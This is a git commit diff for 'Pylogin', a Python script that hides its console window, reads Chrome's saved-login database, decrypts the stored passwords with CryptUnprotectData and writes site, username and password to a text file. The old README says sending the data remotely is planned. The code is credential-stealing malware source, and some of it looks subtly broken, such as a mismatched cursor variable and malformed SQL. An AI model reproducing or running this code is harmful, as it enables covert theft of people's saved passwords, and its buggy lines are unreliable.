1fef20dc4dcced0ce2b25f7a9a6d9909b503cea5
Luis Garcia Calzada <luisxciv@gmail.com>
2017-10-16 04:08:21 -0400

    read me updated

--- Pylogin.py
+++ Pylogin.py
@@ -15,7 +15,7 @@ import sqlite3
 import win32crypt
 import os
 
-#If we want to hide the console 
+#If we want to hide the console for whatever reason
 import win32console, win32gui
 window = win32console.GetConsoleWindow()
 win32gui.ShowWindow(window, 0)
@@ -25,10 +25,13 @@ conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Def
 connection = conn.cursor()
 conn.execute(" busy_timeout = 300000") 
 connection.execute('Select action_url, username_value, password_value FROM logins')
+# make the file
 myfile = open(r"Chromepass.txt", "a+")
 
 # we write to the file
 myfile.write("Chrome Saved Passwords\n")
+
+#Here the Crpyunprotectdata module comes into play. It decrypts the dtaa with the login credentials of the logged in user.
 for result in cursor.fetchall():
 
     password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
--- README.md
+++ README.md
@@ -1,2 +1,3 @@
 # Pylogin
-A python script that grabs the username, password and website of the database where all your chrome login details are stored. Will be working on sending them remotely
+
+This script extracts the data from google chrome's sqlite3 db. The logins table contains the columns; origin_url, username_value and password_vale as seen visually in this image.
